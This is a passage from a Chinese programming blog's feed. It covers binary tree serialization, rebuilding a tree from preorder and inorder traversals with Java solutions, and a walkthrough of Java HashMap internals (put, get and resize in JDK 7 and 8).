某种符号表示空节点（#）</p><p>二叉树的反序列化(Deserialize)是指：根据某种遍历顺序得到的序列化字符串结果str，重构二叉树。</p><img src="/image/binaryTree.assets/image-20230403122123263.png" alt="image-20230403122123263" style="zoom:50%;" /><p>层序序列化(即用函数Serialize转化)如上的二叉树转为”{1,2,3,#,#,6,7}”，再能够调用反序列化(Deserialize)将”{1,2,3,#,#,6,7}”构造成如上的二叉树。</p><p>当然你也可以根据满二叉树结点位置的标号规律来序列化，还可以根据先序遍历和中序遍历的结果来序列化。不对序列化之后的字符串进行约束，所以欢迎各种奇思妙想。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：&#123;1,2,3,#,#,6,7&#125;</span><br><span class="line">输出：&#123;1,2,3,#,#,6,7&#125;</span><br></pre></td></tr></table></figure><p>思路：</p><p><strong>序列化：</strong></p><p>借助队列对二叉树做层序遍历，并将叶子结点的 <code>null</code>打印出来</p><p>设 <em>m</em> 为列表区间 [0,<em>n</em>] 中的 <code>null</code> 节点个数，则可总结出根节点、左子节点、右子节点的列表索引的递推公式：</p><img src="/image/binaryTree.assets/image-20230403122358764.png" alt="image-20230403122358764" style="zoom:50%;" /><img src="/image/binaryTree.assets/image-20230403122408581.png" alt="image-20230403122408581" style="zoom:50%;" /><p><strong>反序列化：</strong></p><p>基于本文开始推出的 node , node.left , node.right 在序列化列表中的位置关系，可实现反序列化。</p><p>利用队列按层构建二叉树，借助一个指针 i 指向节点 node 的左、右子节点，每构建一个 node 的左、右子节点，指针 i 就向右移动<br>1 位。</p><img src="/image/binaryTree.assets/image-20230403123211712.png" alt="image-20230403123211712" style="zoom:50%;" /><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function">String <span class="title">Serialize</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;[]&quot;</span>;</span><br><span class="line">        &#125;   </span><br><span class="line">        StringBuilder res = <span class="keyword">new</span> StringBuilder(<span class="string">&quot;[&quot;</span>);</span><br><span class="line">        Queue&lt;TreeNode&gt; queue = <span class="keyword">new</span> LinkedList&lt;TreeNode&gt;() &#123;&#123; add(root); &#125;&#125;;</span><br><span class="line">        <span class="keyword">while</span>(!queue.isEmpty())&#123;</span><br><span class="line">            TreeNode node = queue.poll();</span><br><span class="line">            <span class="keyword">if</span>(node != <span class="keyword">null</span>)&#123;</span><br><span class="line">                res.append(node.val + <span class="string">&quot;,&quot;</span>);</span><br><span class="line">                queue.add(node.left);</span><br><span class="line">                queue.add(node.right);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                res.append(<span class="string">&quot;null,&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        res.deleteCharAt(res.length() - <span class="number">1</span>);</span><br><span class="line">        res.append(<span class="string">&quot;]&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> res.toString();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">TreeNode <span class="title">Deserialize</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">if</span>(str.equals(<span class="string">&quot;[]&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       String[] vals = str.substring(<span class="number">1</span>, str.length() - <span class="number">1</span>).split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">       TreeNode root = <span class="keyword">new</span> TreeNode(Integer.parseInt(vals[<span class="number">0</span>]));</span><br><span class="line">       Queue&lt;TreeNode&gt; queue = <span class="keyword">new</span> LinkedList&lt;TreeNode&gt;() &#123;&#123;add(root);&#125;&#125;;</span><br><span class="line">       <span class="keyword">int</span> i = <span class="number">1</span>;</span><br><span class="line">       <span class="keyword">while</span>(!queue.isEmpty())&#123;</span><br><span class="line">        TreeNode node = queue.poll();</span><br><span class="line">        <span class="keyword">if</span>(!vals[i].equals(<span class="string">&quot;null&quot;</span>))&#123;</span><br><span class="line">            node.left = <span class="keyword">new</span> TreeNode(Integer.parseInt(vals[i]));</span><br><span class="line">            queue.add(node.left);</span><br><span class="line">        &#125;</span><br><span class="line">        i++;</span><br><span class="line">        <span class="keyword">if</span>(!vals[i].equals(<span class="string">&quot;null&quot;</span>))&#123;</span><br><span class="line">            node.right = <span class="keyword">new</span> TreeNode(Integer.parseInt(vals[i]));</span><br><span class="line">            queue.add(node.right);</span><br><span class="line">        &#125;</span><br><span class="line">        i++;</span><br><span class="line">       &#125;</span><br><span class="line">       System.out.println(Arrays.asList(vals));</span><br><span class="line">       <span class="keyword">return</span> root;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="BM40-重建二叉树"><a href="#BM40-重建二叉树" class="headerlink" title="BM40 重建二叉树"></a><strong>BM40</strong> <strong>重建二叉树</strong></h2><p>给定节点数为 n 的二叉树的前序遍历和中序遍历结果，请重建出该二叉树并返回它的头结点。</p><p>例如输入前序遍历序列{1,2,4,7,3,5,6,8}和中序遍历序列{4,7,2,1,5,3,8,6}，则重建出如下图所示。</p><p><img src="/image/binaryTree.assets/776B0E5E0FAD11A6F15004B29DA5E628.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：[1,2,4,7,3,5,6,8],[4,7,2,1,5,3,8,6]</span><br><span class="line">输出：&#123;1,2,3,4,#,5,6,#,7,#,#,8&#125;</span><br></pre></td></tr></table></figure><p>思路：</p><p>对于二叉树的前序遍历，我们知道序列的第一个元素必定是根节点的值，因为序列没有重复的元素，因此中序遍历中可以找到相同的这个元素，而我们又知道中序遍历中根节点将二叉树分成了左右子树两个部分，如下图所示</p><img src="/image/binaryTree.assets/image-20230404111221225.png" alt="image-20230404111221225" style="zoom:50%;" /><p>数字1是根节点，并将二叉树分成了(247)和(3568)两棵子树，而子树的的根也是相应前序序列的首位，比如左子树的根是数字2，右子树的根是数字3，这样我们就可以利用前序遍历序列找子树的根节点，利用中序遍历序列区分每个子树的节点数。</p><p>算法步骤：</p><ul><li>step 1：先根据前序遍历第一个点建立根节点。</li><li>step 2：然后遍历中序遍历找到根节点在数组中的位置。</li><li>step 3：再按照子树的节点数将两个遍历的序列分割成子数组，将子数组送入函数建立子树。</li><li>step 4：直到子树的序列长度为0，结束递归。</li></ul><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> TreeNode <span class="title">reConstructBinaryTree</span><span class="params">(<span class="keyword">int</span> [] pre,<span class="keyword">int</span> [] vin)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = pre.length;</span><br><span class="line">        <span class="keyword">int</span> m = vin.length;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(n == <span class="number">0</span> || m == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 构建根结点</span></span><br><span class="line">        TreeNode root = <span class="keyword">new</span> TreeNode(pre[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; vin.length; i++)&#123;</span><br><span class="line">            <span class="comment">// 找到前序遍历的第一个元素</span></span><br><span class="line">            <span class="keyword">if</span>(pre[<span class="number">0</span>] == vin[i])&#123;</span><br><span class="line">                root.left = reConstructBinaryTree(</span><br><span class="line">                    Arrays.copyOfRange(pre, <span class="number">1</span>, i + <span class="number">1</span>), </span><br><span class="line">                    Arrays.copyOfRange(vin, <span class="number">0</span>, i));</span><br><span class="line">            </span><br><span class="line">            root.right = reConstructBinaryTree(</span><br><span class="line">                Arrays.copyOfRange(pre, i + <span class="number">1</span>, pre.length), </span><br><span class="line">                Arrays.copyOfRange(vin, i + <span class="number">1</span>, vin.length));</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>思路2：</strong>使用栈辅助，使用非递归前序遍历，然后依次建立结点</p><ul><li>step 1：首先前序遍历第一个数字依然是根节点，并建立栈辅助遍历。</li><li>step 2：然后我们就开始判断，在前序遍历中相邻的两个数字必定是只有两种情况：要么前序后一个是前一个的左节点；要么前序后一个是前一个的右节点或者其祖先的右节点。</li><li>step 3：我们可以同时顺序遍历pre和vin两个序列，判断是否是左节点，如果是左节点则不断向左深入，用栈记录祖先，如果不是需要弹出栈回到相应的祖先，然后进入右子树，整个过程类似非递归前序遍历。</li></ul><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> TreeNode <span class="title">buildTree</span><span class="params">(<span class="keyword">int</span>[] pre, <span class="keyword">int</span>[] vin)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = pre.length;</span><br><span class="line">        <span class="keyword">int</span> m = vin.length;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(n == <span class="number">0</span> || m == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Stack&lt;TreeNode&gt; s = <span class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line">        <span class="comment">// 前序的第一个即根结点</span></span><br><span class="line">        TreeNode root = <span class="keyword">new</span> TreeNode(pre[<span class="number">0</span>]);</span><br><span class="line">        TreeNode cur = root;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>, j = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(cur.val != vin[j])&#123;</span><br><span class="line">                cur.left = <span class="keyword">new</span> TreeNode(pre[i]);</span><br><span class="line">                s.push(cur);</span><br><span class="line">                cur = cur.left;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                j++;</span><br><span class="line">                <span class="comment">// 弹出到符合的祖先</span></span><br><span class="line">                <span class="keyword">while</span>(!s.isEmpty() &amp;&amp; s.peek().val == vin[j])&#123;</span><br><span class="line">                    cur = s.pop();</span><br><span class="line">                    j++;</span><br><span class="line">                &#125;</span><br><span class="line">                cur.right = <span class="keyword">new</span> TreeNode(pre[i]);</span><br><span class="line">                cur = cur.right;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;二叉树的遍历&quot;&gt;&lt;a href=&quot;#二叉树的遍历&quot; class=&quot;headerlink&quot; title=&quot;二叉树的遍历&quot;&gt;&lt;/a&gt;二叉树的遍历&lt;/h2&gt;&lt;p&gt;二叉树是一个包含 &lt;strong&gt;节点&lt;/strong&gt;，以及它的 &lt;strong&gt;左右孩子&lt;/strong</summary>
      
    
    
    
    <category term="算法" scheme="https://banana69.site/categories/%E7%AE%97%E6%B3%95/"/>
    
    
  </entry>
  
  <entry>
    <title>HashMap 学习</title>
    <link href="https://banana69.site/2023/04/01/HashMap-%E5%AD%A6%E4%B9%A0/"/>
    <id>https://banana69.site/2023/04/01/HashMap-%E5%AD%A6%E4%B9%A0/</id>
    <published>2023-04-01T11:00:17.000Z</published>
    <updated>2023-04-12T04:32:39.119Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-HashMap-简介"><a href="#0x01-HashMap-简介" class="headerlink" title="0x01 HashMap 简介"></a>0x01 HashMap 简介</h2><p><code>java.util.HashMap</code>是一个用于存储键值对的集合，每一个键值对称为 Entry。这些键值对分散存储在一个数组当中，这个数组就是 HashMap 的主干，它基于哈希表的 Map 接口实现，是常用的 Java 集合之一，是非线程安全的。</p><p><code>HashMap</code> 可以存储 null 的 key 和 value，但 null 作为键只能有一个，null 作为值可以有多个</p><p>JDK1.8 之前 HashMap 由 数组+链表 组成的，数组是 HashMap 的主体，链表则是主要为了解决哈希冲突而存在的（“拉链法”解决冲突）。 JDK1.8 以后的 <code>HashMap</code> 在解决哈希冲突时有了较大的变化，当链表长度大于阈值（默认为 8）（将链表转换成红黑树前会判断，如果当前数组的长度小于 64，那么会选择先进行数组扩容，而不是转换为红黑树）时，将链表转化为红黑树，以减少搜索时间。</p><p><code>HashMap</code> 默认的初始化大小为 16。之后每次扩充，容量变为原来的 2 倍。并且， <code>HashMap</code> 总是使用 2 的幂作为哈希表的大小。</p><h2 id="0x02-HashMap创建（jdk7）"><a href="#0x02-HashMap创建（jdk7）" class="headerlink" title="0x02 HashMap创建（jdk7）"></a>0x02 HashMap创建（jdk7）</h2><p>使用<code>map.put(&quot;key&quot;,value)</code>可以将数据插入到HashMap中</p><p><img src="/image/HashMap-%E5%AD%A6%E4%B9%A0.assets/image-20230401191559411.png" alt="image-20230401191559411"></p><p>这里的table是HashMap的数组部分，第一个<code>if</code>判断 table 是否被创建，如果没有创建，则创建一个table</p><p><img src="/image/HashMap-%E5%AD%A6%E4%B9%A0.assets/20200807135721471.png" alt="2"></p><h4 id="table-创建过程"><a href="#table-创建过程" class="headerlink" title="table 创建过程"></a>table 创建过程</h4><ul><li><p>在没有指定的情况下，默认的<code>loadFactor</code>为0.75f，默认的<code>initialCapacity</code>为16</p><p>首先会对 table 的容量进行纠正</p><p><img src="/image/HashMap-%E5%AD%A6%E4%B9%A0.assets/image-20230401194305024.png" alt="image-20230401194305024"></p></li><li><p>这里的 <code>capacity</code>表示大于等于<code>toSize</code>的数字中，最接近<code>toSize</code>的 2 的幂，默认值是 16 ，因此这里输出也是 16。如果在构造器中输入了<code>initialCapacity</code>为 18，那么大于 18 又是最近的 2 的幂，只能是 32，这个函数会返回 32 </p></li><li><p>更新阈值为<code>capacity * loadFactor</code></p><p><img src="/image/HashMap-%E5%AD%A6%E4%B9%A0.assets/image-20230401200344350.png" alt="image-20230401200344350"></p><p>阈值为 table 的容量和负载因子的乘积</p></li><li><p>创建数组</p><p><img src="/image/HashMap-%E5%AD%A6%E4%B9%A0.assets/20200807133445389.png" alt="创建"></p><p><img src="/image/HashMap-%E5%AD%A6%E4%B9%A0.assets/image-20230401200557900.png" alt="image-20230401200557900"></p><p>table 是一个 Entry[] 类型的数组，Entry是我们操作的键值对，它的 key 是 final 类型不可修改，有 next 属性表示可以多个 Entry 转变成链表，且带有哈希值。</p></li></ul><h2 id="0x03-HashMap创建（jdk8）"><a href="#0x03-HashMap创建（jdk8）" class="headerlink" title="0x03 HashMap创建（jdk8）"></a>0x03 HashMap创建（jdk8）</h2><p>JDK1.8 在解决哈希冲突时有了，较大的变化。</p><p>当链表长度大于阈值（默认为 8）时，会首先调用 <code>treeifyBin()</code>方法。这个方法会根据 HashMap 数组来决定是否转换为红黑树。只有当数组长度大于或者等于 64 的情况下，才会执行转换红黑树操作，以减少搜索时间。否则，就是只是执行 <code>resize()</code> 方法对数组扩容。</p><h2 id="0x04-put-方法（jdk7）"><a href="#0x04-put-方法（jdk7）" class="headerlink" title="0x04 put 方法（jdk7）"></a>0x04 put 方法（jdk7）</h2><p>HashMap 只提供了put用于添加元素，putVal方法是给put方法调用的一个方法，并没有提供给用户使用。</p><ul><li><p>对与键值对的key首先通过<code>hash()</code>方法得到hash值，然后调用<code>indexFor(hash, length)</code>方法计算出当前 Entry 要插入在 table 的哪一个位置。</p><p><img src="/image/HashMap-%E5%AD%A6%E4%B9%A0.assets/image-20230401202024167.png" alt="image-20230401202024167"></p></li><li><p><code>hash(key)</code>方法是计算对应key的哈希值。在<code>indexFor(int h, int length)</code>方法中对哈希值进行<code>h &amp; (length-1)</code>操作，length 就是 table 的长度。这里表示，length 数值为多少，就取 hash 低多少位的值，这个值的范围是 [0,ength -1]，保证这个值可以放到 table 中的某个位置上。</p><p><img src="/image/HashMap-%E5%AD%A6%E4%B9%A0.assets/image-20230401202100550.png" alt="image-20230401202100550"></p></li><li><p>找到要插入的位置 i， 然后判断<code>table[i]</code>是不是为空，如果为空则忽略 for 循环，执行插入操作，如果不为空，则遍历<code>table[i]</code>的 Entry，如果待插入的 key 已经存在，新的 value 覆盖旧的 value，并返回 value。如果在 for 当中没有 return，即说明 table 中可以插入这个 Entry，下一步准备插入（<code>modCount</code>表示HashMap 的修改次数）。</p><p><img src="/image/HashMap-%E5%AD%A6%E4%B9%A0.assets/image-20230401202758590.png" alt="image-20230401202758590"></p></li><li><p>进入<code>addEntry(hash, key, value, i)</code>方法，首先会对 table 中拥有的 Entry 数量是否超过阈值进行判断，这个阈值为 table 容量乘以负载因子。</p><ul><li><p>假设 table 中的容量没有达到阈值，则进行<code>createEntry</code>方法</p><p><img src="/image/HashMap-%E5%AD%A6%E4%B9%A0.assets/20200807142400994.png" alt="createEntry"></p><ul><li> 如果定位到的数组位置没有元素 就直接插入。</li><li>如果定位到的数组位置有元素，遍历以这个元素为头结点的链表，依次和插入的 key 比较，如果 key 相同就直接覆盖，不同就采用头插法插入元素。</li></ul></li><li><p>如果 table 中的容量达到阈值，<strong>并且当前待插入的位置 table[i] 已有元素</strong>，此时才会进行扩容。</p></li></ul></li></ul><h2 id="0x05-put方法（jdk8）"><a href="#0x05-put方法（jdk8）" class="headerlink" title="0x05 put方法（jdk8）"></a>0x05 put方法（jdk8）</h2><p><img src="/image/HashMap-%E5%AD%A6%E4%B9%A0.assets/d669d29c.png" alt="img"></p><ul><li><p>如果定位到的数组位置没有元素 就直接插入。</p></li><li><p>如果定位到的数组位置有元素就和要插入的 key 比较，如果 key 相同就直接覆盖，如果 key 不相同，就判断 p 是否是一个树节点，如果是就调用<code>e = ((TreeNode&lt;K,V&gt;)p).putTreeVal(this, tab, hash, key, value)</code>将元素添加进入。如果不是就遍历链表插入(插入的是链表尾部)。（jdk1.7中使用头插法不满足原子性，且可能出现死循环）</p></li></ul><ol><li>首先判断数组table[i]是否为空或为null，如果是的话执行resize()进行扩容;</li><li>然后会根据键值 key 计算 hash 得到出入的数据索引 i，如果table[i]==null，直接新建节点添加，插入成功后，判断实际存在的键值对数量size是否超多了最大容量threshold，如果超过，进行扩容。</li><li>判断table[i]的首个元素是否和key一样，如果相同直接覆盖value，否则进行下一步</li><li>判断table[i] 是否为treeNode，即table[i] 是否是红黑树，如果是红黑树，则直接在树中插入键值对，否则进行下一步</li><li>遍历table[i]，判断链表长度是否大于8，大于8的话把链表转换为红黑树，在红黑树中执行插入操作，否则进行链表的插入操作；遍历过程中若发现key已经存在直接覆盖value即可</li><li>插入成功后，判断实际存在的键值对数量size是否超多了最大容量threshold，如果超过，进行扩容。</li></ol><p><strong>put 方法源码：</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> V <span class="title">put</span><span class="params">(K key, V value)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 对key的hashCode()做hash</span></span><br><span class="line">    <span class="keyword">return</span> putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">final</span> V <span class="title">putVal</span><span class="params">(<span class="keyword">int</span> hash, K key, V value, <span class="keyword">boolean</span> onlyIfAbsent,</span></span></span><br><span class="line"><span class="params"><span class="function">              <span class="keyword">boolean</span> evict)</span> </span>&#123;</span><br><span class="line">   Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; p; <span class="keyword">int</span> n, i;</span><br><span class="line">   <span class="comment">// 步骤①：tab为空则创建</span></span><br><span class="line">    <span class="keyword">if</span> ((tab = table) == <span class="keyword">null</span> || (n = tab.length) == <span class="number">0</span>)</span><br><span class="line">        n = (tab = resize()).length;</span><br><span class="line">    <span class="comment">// 步骤②：计算index，并对null做处理 </span></span><br><span class="line">    <span class="keyword">if</span> ((p = tab[i = (n - <span class="number">1</span>) &amp; hash]) == <span class="keyword">null</span>)</span><br><span class="line">        tab[i] = newNode(hash, key, value, <span class="keyword">null</span>);</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        Node&lt;K,V&gt; e; K k;</span><br><span class="line">        <span class="comment">// 步骤③：节点key存在，直接覆盖value</span></span><br><span class="line">        <span class="keyword">if</span> (p.hash == hash &amp;&amp;</span><br><span class="line">            ((k = p.key) == key || (key != <span class="keyword">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">            e = p;</span><br><span class="line">        <span class="comment">// 步骤④：判断该链为红黑树</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (p <span class="keyword">instanceof</span> TreeNode)</span><br><span class="line">            e = ((TreeNode&lt;K,V&gt;)p).putTreeVal(<span class="keyword">this</span>, tab, hash, key, value);</span><br><span class="line">        <span class="comment">// 步骤⑤：该链为链表</span></span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> binCount = <span class="number">0</span>; ; ++binCount) &#123;</span><br><span class="line">                <span class="keyword">if</span> ((e = p.next) == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    p.next = newNode(hash, key,value,<span class="keyword">null</span>);</span><br><span class="line">                    <span class="comment">//链表长度大于8转换为红黑树进行处理</span></span><br><span class="line">                    <span class="keyword">if</span> (binCount &gt;= TREEIFY_THRESHOLD - <span class="number">1</span>) <span class="comment">// -1 for 1st  </span></span><br><span class="line">                        treeifyBin(tab, hash);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">               <span class="comment">// key已经存在直接覆盖value</span></span><br><span class="line">                <span class="keyword">if</span> (e.hash == hash &amp;&amp;</span><br><span class="line">                    ((k = e.key) == key || (key != <span class="keyword">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">                           <span class="keyword">break</span>;</span><br><span class="line">                p = e;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (e != <span class="keyword">null</span>) &#123; <span class="comment">// existing mapping for key</span></span><br><span class="line">            V oldValue = e.value;</span><br><span class="line">            <span class="keyword">if</span> (!onlyIfAbsent || oldValue == <span class="keyword">null</span>)</span><br><span class="line">                e.value = value;</span><br><span class="line">            afterNodeAccess(e);</span><br><span class="line">            <span class="keyword">return</span> oldValue;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ++modCount;</span><br><span class="line">    <span class="comment">// 步骤⑥：超过最大容量 就扩容</span></span><br><span class="line">    <span class="keyword">if</span> (++size &gt; threshold)</span><br><span class="line">        resize();</span><br><span class="line">    afterNodeInsertion(evict);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x06-get方法（jdk7）"><a href="#0x06-get方法（jdk7）" class="headerlink" title="0x06 get方法（jdk7）"></a>0x06 get方法（jdk7）</h2><ul><li><p>首先判断 key 的情况，如果传入的是一个null，则从 table[0]中取值：</p><p><img src="/image/HashMap-%E5%AD%A6%E4%B9%A0.assets/image-20230401210951680.png" alt="image-20230401210951680"></p><p>遍历table[0]的 Entry 链表，找到 key 为 null 的值返回，这里 null 值从 table[0]中找是因为，null 的哈希值永远为 0，因此放在table[0] 的位置</p></li><li><p>知道了要查询的 key 在 table 的哪一个位置后，开始遍历这个位置的链表，首先得判断待查询的 key 和遍历到的 Entry 的 key 的哈希值是否一样，然后判断两个 key 是否一样，都一样才会返回这个 Entry。</p><p><img src="/image/HashMap-%E5%AD%A6%E4%B9%A0.assets/image-20230401211312776.png" alt="image-20230401211312776"></p></li></ul><h2 id="0x07-get方法（jdk）"><a href="#0x07-get方法（jdk）" class="headerlink" title="0x07 get方法（jdk）"></a>0x07 get方法（jdk）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> V <span class="title">get</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    Node&lt;K,V&gt; e;</span><br><span class="line">    <span class="keyword">return</span> (e = getNode(hash(key), key)) == <span class="keyword">null</span> ? <span class="keyword">null</span> : e.value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">final</span> Node&lt;K,V&gt; <span class="title">getNode</span><span class="params">(<span class="keyword">int</span> hash, Object key)</span> </span>&#123;</span><br><span class="line">    Node&lt;K,V&gt;[] tab; </span><br><span class="line">  Node&lt;K,V&gt; first, e;</span><br><span class="line">  <span class="keyword">int</span> n; K k;</span><br><span class="line">    <span class="keyword">if</span> ((tab = table) != <span class="keyword">null</span> &amp;&amp; (n = tab.length) &gt; <span class="number">0</span> &amp;&amp;</span><br><span class="line">        (first = tab[(n - <span class="number">1</span>) &amp; hash]) != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 数组元素相等</span></span><br><span class="line">        <span class="keyword">if</span> (first.hash == hash &amp;&amp; <span class="comment">// always check first node</span></span><br><span class="line">            ((k = first.key) == key || (key != <span class="keyword">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">            <span class="keyword">return</span> first;</span><br><span class="line">        <span class="comment">// 桶中不止一个节点</span></span><br><span class="line">        <span class="keyword">if</span> ((e = first.next) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 当这个table节点上存储的是红黑树结构时，在根节点first上调用getTreeNode方法，在内部遍历红黑树节点，查看是否有匹配的TreeNode。</span></span><br><span class="line">            <span class="keyword">if</span> (first <span class="keyword">instanceof</span> TreeNode)</span><br><span class="line">                <span class="keyword">return</span> ((TreeNode&lt;K,V&gt;)first).getTreeNode(hash, key);</span><br><span class="line">            <span class="comment">// 在链表中get</span></span><br><span class="line">            <span class="keyword">do</span> &#123;</span><br><span class="line">              <span class="comment">// 当这个table节点上存储的是链表结构时，用跟第14行同样的方式去判断key是否相同。</span></span><br><span class="line">                <span class="keyword">if</span> (e.hash == hash &amp;&amp;</span><br><span class="line">                    ((k = e.key) == key || (key != <span class="keyword">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">                    <span class="keyword">return</span> e;</span><br><span class="line">              <span class="comment">// 如果key不同，一直遍历下去直到链表尽头，e.next == null。</span></span><br><span class="line">            &#125; <span class="keyword">while</span> ((e = e.next) != <span class="keyword">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>根据 key 及其 hash 值查询 node 节点，如果存在则返回该节点的 value 值</li><li>根据 key 搜索 节点的方法，这里判断 key 相等的条件是hash值相同 并且 符合equals方法</li><li>根据hash值，可以直接计算出对应的下标（n - 1）&amp; hash，缩小查询范围，如果存在结果，则必定在table的这个位置上</li><li>判断第一个存在的节点的key是否和查询的key相等。如果相等，直接返回该节点</li><li>遍历该链表/红黑树直到next为null。</li></ul><h2 id="0x08-扩容（jdk7）"><a href="#0x08-扩容（jdk7）" class="headerlink" title="0x08 扩容（jdk7）"></a>0x08 扩容（jdk7）</h2><img src="/image/HashMap-学习.assets/image-20230412122100175.png" alt="image-20230412122100175" style="zoom:25%;" /><p>在插入一个新的键值对进行put时会进行：</p><ol><li><p>计算key的哈希值，然后根据哈希值和table的长度计算出待插入的位置 i</p></li><li><p>判断这个位置 i 是否和待插入的 key 相同的值，如果有则返回table中和待插入key相同的Entry的value</p></li><li><p>如果 table[i] 没有和待插入相同的 key ，则先对修改次数<code>modCount</code>加一，然后调用<code>addEntry(hash, key, value, i)</code>准备插入</p><ul><li><p>当确定可以插入时，HashMap会检查当前table的状态是否可以插入，当满足 if 条件时会进行 resize 扩容</p><p><img src="/image/HashMap-%E5%AD%A6%E4%B9%A0.assets/image-20230401221422418.png" alt="image-20230401221422418"></p></li><li><p>扩容是直接容量变为之前的两倍</p><p><img src="/image/HashMap-%E5%AD%A6%E4%B9%A0.assets/image-20230401222043739.png" alt="image-20230401222043739"></p></li><li><p>在进行扩容时，会先把旧的 table 的数据和长度临时保存起来，然后再判断旧的 table 容量是否已经处于可以设置的上限</p><p><img src="/image/HashMap-%E5%AD%A6%E4%B9%A0.assets/image-20230401223624752.png" alt="image-20230401223624752"></p></li><li><p>如果旧的 table 的容量已经达到可设置的上限，那么阈值直接变为 int 类型的最大值，也就是以后触发阈值的机会变得很少。然后直接 return。通过把阈值设置成特别大，也减少进入这个 resize 的机会。</p><p><img src="/image/HashMap-%E5%AD%A6%E4%B9%A0.assets/image-20230401222658518.png" alt="image-20230401222658518"></p></li><li><p>如果旧 table 的容量尚未达到可设置的最大值，那么说明可以进行resize，进行下一步，创建新的 EntryTable数组</p><p><img src="/image/HashMap-%E5%AD%A6%E4%B9%A0.assets/image-20230401222805546.png" alt="image-20230401222805546"></p></li><li><p>把旧的table的元素放到newTable中</p><p><img src="/image/HashMap-%E5%AD%A6%E4%B9%A0.assets/image-20230401223257093.png" alt="image-20230401223257093"></p></li><li><p>最后会更新 table 为 newTable，同时阈值也会重新设置</p><p><img src="/image/HashMap-%E5%AD%A6%E4%B9%A0.assets/image-20230401223411799.png" 